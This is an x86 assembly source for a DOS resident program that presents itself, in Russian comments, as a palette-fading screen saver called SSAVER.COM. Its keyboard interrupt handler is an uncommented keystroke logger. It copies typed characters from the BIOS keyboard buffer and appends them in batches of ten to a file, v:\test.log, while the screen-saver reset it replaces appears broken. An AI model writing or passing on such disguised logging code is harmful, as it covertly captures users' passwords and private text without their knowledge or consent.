.186
LOCALS  @@                                      ; локальные метки начинаются с @@

        ACTIVATE  EQU   10                     ; время астивизации хранителя экрана
        PROCESS_INT EQU 16H                     ; выбранной мультиплексное прерывание

CODE    SEGMENT                                 ; определение сегмента кода
        ASSUME    CS:CODE, DS:CODE              ; DS и CS связаны с кодовым сегментом
        ORG       100H                          ; программа типа COM
BEGIN:  JMP       START                         ; переход на секцию инициализации

        KBHANDLER DD    0                       ; переменная для хранения
        TIMERHANDLER DD 0                       ; адресов старых обработчиков
        MULTIPLEX DD    0                       ; прерываний
        TIME      DW    0                       ; счстчик тиков таймера
        STATE     DB    64                      ; уровень яркости
        FINISH    DB    0                       ; флаг окончания работы хранителя экрана

        PNTR      DB    0
        BUF       DB    10 dup(0)
        FILE      DB    'v:\test.log', 0
        EXCEPT    DB    8, 26, 27, '�', 0


KB      PROC                                    ; обработчик прерываний от клавиатуры
        PUSHF                                   ; флаги - в стек
        CALL      CS:KBHANDLER                  ; вызов старого обработчика
        push    ds
        pusha
        xor     bp,  bp
        mov     ax,  40h
        mov     ds,  ax
        mov     bx,  ds:[1Ch]
        in      al,  60h
        cmp     al,  128
        ja      @@5
        dec     bx
        dec     bx
        cmp     bx,  1Eh
        jnb     @@1
        mov     bx,  3Ch
@@1:    mov     bx,  ds:[bx]
        mov     ax,  cs
        mov     ds,  ax
@@2:    cmp     bl, EXCEPT[bp]
        je      @@5
        inc     bp
        cmp     EXCEPT[bp],  0
        jnz     @@2
        xor     ax,  ax
        mov     al,  PNTR
        mov     bp,  ax
        mov     BUF[bp],  bl
        inc     PNTR
        cmp     PNTR, 10
        jne     @@5
        mov     PNTR, 0
        push    ss
        push    sp
        pusha
        mov     ax,  cs
        mov     ds,  ax
        mov     ah,  3Dh
        mov     al,  1
        lea     dx,  FILE
        int     21h
        jnc     @@3
        mov     ah,  3Ch
        mov     cx,  20h
        lea     dx,  FILE
        int     21h
        jc      @@4
@@3:    mov     bx,  ax
        mov     ah,  42h
        mov     al,  2
        xor     dx,  dx
        xor     cx,  cx
        int     21h
        mov     ah,  40h
        mov     cx,  10
        lea     dx,  BUF
        int     21h
        mov     ah,  3Eh
        int     21h
@@4:    popa
        pop     sp
        pop     ss
@@5:    popa
        pop     ds
        IRET                                    ; возврат из прерывания
KB      ENDP                                    ; конец обработчика


CALC    PROC                                    ; процедура линейной интерполяции
        SHL       AL,   1                       ; интерполяция
        SHL       AL,   1                       ; над составляющими цвета
        MUL       STATE                         ; для обеспечения
        MOV       AL,   AH                      ; гашения яркости
        RET                                     ; возврат из процедуры
CALC    ENDP                                    ; конец процедуры


SAVE    PROC                                    ; процедура сохранения палитры
        MOV       CX,   64                      ; сохранение 64 цветов
        XOR       BX,   BX                      ; обнуление BX
@@1:    MOV       DX,   3C7H                    ; индексный регистр VGA для чтения RAM DAC
        MOV       AL,   CL                      ; в AL - цветовой индекс
        DEC       AL                            ; декремент AL
        OUT       DX,   AL                      ; вывод индекса в регистр VGA
        INC       DX                            ; регистр VGA 3C9h -
        INC       DX                            ; чтение RAM DAC
        IN        AL,   DX                      ; чтение красной составляющей
        MOV       BYTE  PTR START[BX], AL       ; запись ес в буфер
        INC       BX                            ; инкремент указателя буфера
        IN        AL,   DX                      ; чтение зелсной составляющей
        MOV       BYTE  PTR START[BX], AL       ; запись ес в буфер
        INC       BX                            ; инкремент указателя буфера
        IN        AL,   DX                      ; чтение синей составляющей
        MOV       BYTE  PTR START[BX], AL       ; запись ес в буфер
        INC       BX                            ; инкремент указателя буфера
        LOOP      @@1                           ; перебор цветов
        RET                                     ; возврат из процедуры
SAVE    ENDP                                    ; конец процедуры


RESTORE PROC                                    ; процедура восстановления палитры
        MOV       CX,   64                      ; восстановление 64 цветов
        XOR       BX,   BX                      ; обнуление BX
@@1:    MOV       DX,   3C8H                    ; индексный регистр VGA для записи RAM DAC
        MOV       AL,   CL                      ; в AL - цветовой индекс
        DEC       AL                            ; декремент AL
        OUT       DX,   AL                      ; вывод индекса в регистр VGA
        INC       DX                            ; регистр VGA 3C9h запись RAM DAC
        MOV       AL,   BYTE PTR START[BX]      ; чтение из буфера красной составляющей
        OUT       DX,   AL                      ; запись ес в RAM DAC
        INC       BX                            ; инкремент указателя буфера
        MOV       AL,   BYTE PTR START[BX]      ; чтение из буфера зелсной составляющей
        OUT       DX,   AL                      ; запись ес в RAM DAC
        INC       BX                            ; инкремент указателя буфера
        MOV       AL,   BYTE PTR START[BX]      ; чтение из буфера синей составляющей
        OUT       DX,   AL                      ; запись ес в RAM DAC
        INC       BX                            ; инкремент указателя буфера
        LOOP      @@1                           ; перебор цветов
        RET                                     ; возврат из процедуры
RESTORE ENDP                                    ; конец процедуры


FADE    PROC                                    ; процедура гашения палитры
        MOV       CX,   64                      ; для текстового режима - 64 цвета
        XOR       BX,   BX                      ; обнуление BX
@@1:    MOV       DX,   3C8H                    ; индексный регистр VGA для записи RAM DAC
        MOV       AL,   CL                      ; в AL - цветовой индекс
        DEC       AL                            ; декремент AL
        OUT       DX,   AL                      ; вывод индекса в регистр VGA
        INC       DX                            ; регистр VGA 3C9h запись RAM DAC
        MOV       AL,   BYTE PTR START[BX]      ; чтение сохранснной красной составляющей
        INC       BX                            ; инкремент указателя буфера
        CALL      CALC                          ; выполнение линейной интерполяции
        OUT       DX,   AL                      ; запись составляющей в RAM DAC
        MOV       AL,   BYTE PTR START[BX]      ; чтение сохранснной зелсной составляющей
        INC       BX                            ; инкремент указателя буфера
        CALL      CALC                          ; выполнение линейной интерполяции
        OUT       DX,   AL                      ; запись составляющей в RAM DAC
        MOV       AL,   BYTE PTR START[BX]      ; чтение сохранснной зелсной составляющей
        INC       BX                            ; инкремент указателя буфера
        CALL      CALC                          ; выполнение линейной интерполяции
        OUT       DX,   AL                      ; запись составляющей в RAM DAC
        LOOP      @@1                           ; перебор цветов
        RET                                     ; возврат из процедуры
FADE    ENDP                                    ; конец процедуры


TIMER   PROC                                    ; обработчик прерываний таймера
        PUSH      DS                            ; сохранение
        PUSH      AX                            ; используемых сегментных
        PUSH      BX                            ; регистров и регистров
        PUSH      CX                            ; общего
        PUSH      DX                            ; назначения
        PUSH      CS                            ; настроим DS на
        POP       DS                            ; сегмент кода (и данных)

        CMP       FINISH, 1                     ; если флаг завершения не установлен
        JNZ       @@3                           ; то продолжается работа хранителя
        MOV       TIME, 0                       ; иначе сброс счстчика тиков
        MOV       FINISH, 0                     ; сброс флага завершения
        CMP       STATE, 64                     ; если палитра не изменена
        JE        @@1                           ; то выход из обработчика
        MOV       STATE, 64                     ; иначе установка уровня яркости
        CALL      VERTRET                       ; вертикальная синхронизация
        CALL      RESTORE                       ; восстановление палитры
        JMP       @@1                           ; выход из обработчика
@@3:    CMP       STATE, 12                     ; если уровень яркости меньше 12
        JB        @@1                           ; то выйти из обработчика
        INC       TIME                          ; инкремент счстчика тиков
        CMP       TIME, ACTIVATE                ; если не пора сохранить палитру,
        JNE       @@2                           ; то пропустить ес сохранение
        CALL      SAVE                          ; сохранить палитру
@@2:    CMP       TIME, ACTIVATE                ; если не пора гасить экран,
        JNA       @@1                           ; то выход из обработчика
        CALL      VERTRET                       ; вертикальная синхронизация
        CALL      FADE                          ; гашение яркости на одну ступень
        DEC       STATE                         ; декремент уровня яркости

@@1:    POP       DX                            ; сохранение
        POP       CX                            ; используемых сегментных
        POP       BX                            ; регистров и регистров
        POP       AX                            ; общего
        POP       DS                            ; назначения
        PUSHF                                   ; флаги - в стек
        CALL      CS:TIMERHANDLER               ; вызов старого обработчика
        IRET                                    ; возврат из обработчика
TIMER   ENDP                                    ; конец обработчика


VERTRET PROC                                    ; процедура вертикальной синхронизации
        MOV       DX,   03DAH                   ; порт статуса развсртки
@@1:    IN        AL,   DX                      ; цикл
        TEST      AL,   8                       ; пока
        JZ        @@1                           ; не
@@2:    IN        AL,   DX                      ; закончена
        TEST      AL,   8                       ; вертикальная
        JNZ       @@2                           ; развсртка
        RET                                     ; возврат из процедуры
VERTRET ENDP                                    ; конец процедуры


UNLOAD  PROC                                    ; процедура выгрузки программы
        PUSH      ES                            ; сохраним сегментные
        PUSH      DS                            ; регистры
        PUSH      DX                            ; и регистры
        PUSH      AX                            ; общего назначения

        MOV       AX,   2509H                   ; функция DOS установки вектора прерывания
        LDS       DX,   CS:KBHANDLER            ; в DS - сегмент, в DX - смещение
        INT       21H                           ; прерывание DOS

        MOV       AX,   251CH                   ; функция DOS установки вектора прерывания
        LDS       DX,   CS:TIMERHANDLER         ; в DS - сегмент, в DX - смещение
        INT       21H                           ; прерывание DOS

        MOV       AH,   25H                     ; функция DOS установки вектора прерывания
        MOV       AL,   PROCESS_INT             ; номер прерывания
        LDS       DX,   CS:MULTIPLEX            ; в DS - сегмент, в DX - смещение
        INT       21H                           ; прерывание DOS

        MOV       ES,   CS:2CH                  ; получение сегмента окружения программы
        MOV       AH,   49H                     ; функция DOS освобождения блока памяти
        INT       21H                           ; прерывание DOS

        PUSH      CS                            ; в ES -
        POP       ES                            ; сегмент кода
        MOV       AH,   49H                     ; функция DOS освобождения блока памяти
        INT       21H                           ; прерывание DOS

        POP       AX                            ; восстановим сегментные
        POP       DX                            ; регистры
        POP       DS                            ; и регистры
        POP       ES                            ; общего назначения
        RET                                     ; возврат из процедуры
UNLOAD  ENDP                                    ; конец процедуры


MULTY   PROC                                    ; процедура связи с резидентной программой
        CMP       AH,   0C8H                    ; если процедура не вызвана
        JNE       @@1                           ; программой SSAVER.COM, то выход
        CMP       AL,   0                       ; если номер функции - 0, то
        JE        @@2                           ; возврат в SSAVER.COM кода в регистрах
        CMP       AL,   1                       ; если номер функции неизвестен, то
        JNE       @@1                           ; выход
        CALL      UNLOAD                        ; иначе выгрузка программы
        IRET                                    ; возврат из обработчика
@@2:    MOV       AL,   0FFH                    ; возврат в
        MOV       DX,   6772H                   ; SSAVER.COM кода в регистрах
        MOV       CX,   6162H                   ; CX и DX
        IRET                                    ; возврат из обработчика
@@1:    JMP       CS:MULTIPLEX                  ; вызов старого обработчика
MULTY   ENDP                                    ; конец процедуры

START:  CALL      ARGS                          ; вызов процедуры разбора параметров
        MOV       AH,   0C8H                    ; проверка,
        MOV       AL,   0                       ; есть ли в памяти
        INT       PROCESS_INT                   ; копия программы
        CMP       AL,   0FFH                    ; если
        JNE       @@2                           ; есть,
        CMP       DX,   6772H                   ; выдача
        JNE       @@2                           ; сообщения об ошибке,
        CMP       CX,   6162H                   ; иначе выполнение
        JE        @@1                           ; загрузки программы
@@2:    CLI                                     ; сброс флага прерываний
        MOV       AX,   3509H                   ; функция DOS получения адреса обработчика
        INT       21H                           ; прерывание DOS
        MOV       WORD  PTR KBHANDLER, BX       ; в BX - смещение обработчика
        MOV       WORD  PTR KBHANDLER+2, ES     ; в ES - сегмент обработчика

        MOV       AX,   351CH                   ; функция DOS получения адреса обработчика
        INT       21H                           ; прерывание DOS
        MOV       WORD  PTR TIMERHANDLER, BX    ; в BX - смещение обработчика
        MOV       WORD  PTR TIMERHANDLER+2, ES  ; в ES - сегмент обработчика

        MOV       AH,   35H                     ; функция DOS получения адреса обработчика
        MOV       AL,   PROCESS_INT             ; номер мультиплексного прерывания
        INT       21H                           ; прерывание DOS
        MOV       WORD  PTR MULTIPLEX, BX       ; в BX - смещение обработчика
        MOV       WORD  PTR MULTIPLEX+2, ES     ; в ES - сегмент обработчика

        MOV       AX,   2509H                   ; функция DOS установки вектора прерывания
        MOV       DX,   OFFSET KB               ; в DX - смещение обработчика
        INT       21H                           ; прерывание DOS

        MOV       AX,   251CH                   ; функция DOS установки вектора прерывания
        MOV       DX,   OFFSET TIMER            ; в DX - смещение обработчика
        INT       21H                           ; прерывание DOS

        MOV       AH,   25H                     ; функция DOS установки вектора прерывания
        MOV       AL,   PROCESS_INT             ; номер мультиплексного прерывания
        MOV       DX,   OFFSET MULTY            ; в DX - смещение обработчика
        INT       21H                           ; прерывание DOS
        STI                                     ; установка флага прерываний

        MOV       AH,   9                       ; функция DOS вывода строки символов
        MOV       DX,   OFFSET MSG3             ; сообщение о загрузке программы
        INT       21H                           ; прерывание DOS

        MOV       AX,   3100H                   ; функция DOS создания TSR
        MOV       DX,   (START-BEGIN+1CFH)/16   ; в DX - размер программы в параграфах
        INT       21H                           ; прерывание DOS

@@1:    MOV       AH,   9                       ; функция DOS вывода строки символов
        LEA       DX,   MSG1                    ; сообщение о невозможности загрузки
        INT       21H                           ; прерывание DOS
        MOV       AX,   4C01H                   ; функция DOS завершения процесса
        INT       21H                           ; прерывание DOS

ARGS    PROC                                    ; процедура разбора параметров
        MOV       SI,   80H                     ; в SI - адрес длины строки параметров
        LODSB                                   ; загрузка длины в AL
        CMP       AL,   0                       ; если длина не нулевая
        JNZ       @@1                           ; продолжение разбора параметров
        CALL      MESSAGE                       ; иначе выдать информацию о программе
        MOV       AX,   4C00H                   ; функция DOS завершения процесса
        INT       21H                           ; прерывание DOS

@@1:    LODSB                                   ; пропуск
        CMP       AL,   20H                     ; пробелов
        JE        @@1                           ; в начале строки
        CMP       AL,   '/'                     ; если не встретилось начало параметра
        JNE       @@2                           ; выдать сообщение об ошибке
        LODSB                                   ; загрузить в AL следущий символ
        CMP       AL,   'i'                     ; если это
        JE        @@3                           ; параметр загрузки,
        CMP       AL,   'I'                     ; то выход
        JE        @@3                           ; и загрузка программы
        CMP       AL,   'u'                     ; если это
        JE        @@4                           ; параметр выгрузки,
        CMP       AL,   'U'                     ; то вызвать
        JE        @@4                           ; процедуру выгрузки

@@2:    MOV       AH,   9                       ; функция DOS вывода строки символов
        MOV       DX,   OFFSET MSG5             ; сообщение об ошибке
        INT       21H                           ; прерывание DOS
        MOV       AX,   4C01H                   ; функция DOS завершения процесса
        INT       21H                           ; прерывание DOS

@@4:    MOV       AH,   0C8H                    ; если
        MOV       AL,   0                       ; программа
        INT       PROCESS_INT                   ; уже
        CMP       AL,   0FFH                    ; загружена
        JNE       @@5                           ; в
        CMP       DX,   6772H                   ; память,
        JNE       @@5                           ; то
        CMP       CX,   6162H                   ; вызвать
        JNE       @@5                           ; процедуру
        MOV       AX,   0C801H                  ; выгрузки
        INT       PROCESS_INT                   ; программы,
        MOV       AH,   9                       ; выдать
        MOV       DX,   OFFSET MSG4             ; сообщение
        INT       21H                           ; об этом
        MOV       AX,   4C00H                   ; и выйти
        INT       21H                           ; в DOS

@@5:    MOV       AH,   9                       ; иначе
        MOV       DX,   OFFSET MSG6             ; выдать сообщение
        INT       21H                           ; об ошибке
        MOV       AX,   4C01H                   ; и выйти
        INT       21H                           ; в DOS
@@3:    RET                                     ; возврат из процедуры
ARGS    ENDP                                    ; конец процедуры


MESSAGE PROC                                    ; процедура выдачи информации о программе
        MOV       CX,   15                      ; вывести на экран 15 строк
        MOV       SI,   OFFSET MSG2             ; в SI - адрес сообщения
@@1:    PUSH      CX                            ; сохранение CX
        MOV       CX,   68                      ; длина каждой строки сообщения
@@2:    MOV       AH,   09H                     ; функция BIOS вывода символа с атрибутом
        MOV       AL,   [SI]                    ; символ
        MOV       BX,   1FH                     ; атрибут
        PUSH      CX                            ; сохранение CX
        MOV       CX,   1                       ; напечатать 1 символ
        INT       10H                           ; прерывание BIOS
        MOV       AH,   3                       ; функция BIOS получения координат курсора
        XOR       BH,   BH                      ; видеостраница 0
        INT       10H                           ; прерывание BIOS
        INC       DL                            ; инкремент координаты X курсора
        MOV       AH,   2                       ; функция BIOS установки координат курсора
        INT       10H                           ; прерывание BIOS
        POP       CX                            ; восстановление CX
        INC       SI                            ; инкремент указателя сообщения
        LOOP      @@2                           ; цикл по столбцам
        POP       CX                            ; восстановление CX
        MOV       AH,   2                       ; функция DOS вывода символа
        MOV       DL,   10                      ; символ перевода строки
        INT       21H                           ; прерывание DOS
        MOV       DL,   13                      ; символ возврата каретки
        INT       21H                           ; прерывание DOS
        LOOP      @@1                           ; цикл по строкам
        RET                                     ; возврат из процедуры
MESSAGE ENDP                                    ; конец процедуры


        MSG1      DB 'Программа уже загружена в память - повторная загрузка невозможна!$'
        MSG2      DB 'є Использование: SSAVER.COM [/I|/U]                                є'
        MSG3      DB 'Программа установлена в память$'
        MSG4      DB 'Программа выгружена из памяти$'
        MSG5      DB 'Неверный аргумент командной строки - запустите SSAVER.COM',10,13
                  DB 'без параметров для получения информации.$'
        MSG6      DB 'Программа ещс не установлена в память!$'


CODE    ENDS                                    ; конец сегмента кода

        END       BEGIN                         ; конец программы